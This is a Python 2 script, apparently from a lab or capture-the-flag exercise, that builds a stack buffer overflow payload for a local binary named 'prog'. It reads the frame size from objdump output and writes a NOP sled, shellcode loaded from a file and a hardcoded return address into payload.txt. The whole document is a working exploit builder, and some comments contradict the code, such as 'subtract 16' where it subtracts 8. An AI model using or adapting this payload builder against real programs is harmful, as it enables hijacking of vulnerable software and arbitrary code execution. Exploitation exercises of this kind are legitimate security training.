#python2


#take an argument from the command line, it will be a hex number in the form 0x410
#convert that input into an integer called buffer_size_raw
import sys
import os

#get the buffer_size_raw by running "objdump -d prog | grep 11d1", the output looks like this:
#11d1:       48 81 ec 10 02 00 00    sub    $0x210,%rsp
#the hex number after sub is the buffer size, in this case 0x210

os.system("objdump -d prog | grep 11d1 > buffer_size.txt")
#remove everything but the hex number
os.system("sed -i 's/.*sub.*\\$//' buffer_size.txt")
os.system("sed -i 's/,.*//' buffer_size.txt")
#read the buffer_size.txt file and store it in a variable
with open('buffer_size.txt', 'r') as myfile:
    buffer_size_raw=myfile.read().replace('\n', '')

#convert the hex number to an integer
buffer_size_raw = int(buffer_size_raw, 16)
#print buffer_size_raw

#get the size of the shellcode
sizeOfShellcode_raw = os.path.getsize('shellcode.txt')
#print sizeOfShellcode_raw
sizeOfShellcode = sizeOfShellcode_raw/4
print "Size of the shellcode is: " +str(sizeOfShellcode)


#subtract 16 from the buffer_size_raw to get the size of the buffer, this will be the nop sled
buffer_size = (buffer_size_raw-8)-sizeOfShellcode
print "Buffer size filled with NoOps: " + str(buffer_size)


#shellcode literal = the values within the shellcode.txt file
with open('shellcode.txt', 'r') as myfile:
    shellcode=myfile.read().replace('\n', '')

#convert shellcode from string to literal
shellcode = shellcode.decode('string_escape')










address = '\x58\xdb\xff\xff\xff\x7f' #hex value






payloadString = '\x90'*buffer_size+shellcode+address

payloadString.replace('\n','')

#print payloadString

#save the payload to a file
with open('payload.txt', 'w') as myfile:
    myfile.write(payloadString)

#remove newline characters from payload.txt
os.system("sed -i 's/\\n//g' payload.txt")


